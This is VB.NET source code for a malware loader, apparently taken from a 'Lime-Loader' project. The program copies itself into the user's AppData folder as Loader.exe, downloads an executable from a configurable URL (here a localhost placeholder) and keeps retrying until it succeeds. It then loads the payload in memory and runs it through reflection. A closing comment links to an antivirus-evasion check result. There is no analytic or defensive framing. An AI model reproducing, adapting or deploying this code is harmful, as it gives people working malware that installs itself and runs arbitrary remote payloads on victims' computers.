'https://github.com/NYAN-x-CAT/Lime-Loader

Public Class Program


    Public Shared Sub Main()
        Installer("26", "Loader.exe")
        Load("http://127.0.0.1:80/Payload.exe")
    End Sub

    Private Shared Sub Load(ByVal Loader As String)

        Dim Assembly As Reflection.Assembly = Threading.Thread.GetDomain.Load(Download(Loader))
        Dim Entrypoint As Reflection.MethodInfo = Assembly.EntryPoint

        If Entrypoint.GetParameters().Length > 0 Then
            Entrypoint.Invoke(Nothing, New Object() {Nothing})
        Else
            Entrypoint.Invoke(Nothing, Nothing)
        End If

    End Sub

    Private Shared Sub Installer(ByVal Path As String, ByVal Name As String)
        If Diagnostics.Process.GetCurrentProcess.MainModule.FileName <> IO.Path.Combine(Environment.GetFolderPath(Path), Name) Then

            Try
                IO.File.Copy(Diagnostics.Process.GetCurrentProcess.MainModule.FileName, IO.Path.Combine(Environment.GetFolderPath(Path), Name), True)
            Catch ex As Exception
            End Try

        End If
    End Sub

    Private Shared Function Download(ByVal URL As String) As Byte()
        Using WC As New Net.WebClient

            Try
re:
                Dim B As Byte() = WC.DownloadData(URL)
                WC.Dispose()
                Return B
            Catch ex As Exception
                Threading.Thread.Sleep(5000)
                GoTo re
            End Try

        End Using
    End Function

End Class


'http://avcheck.net/id/mTYMhMvaPa6c
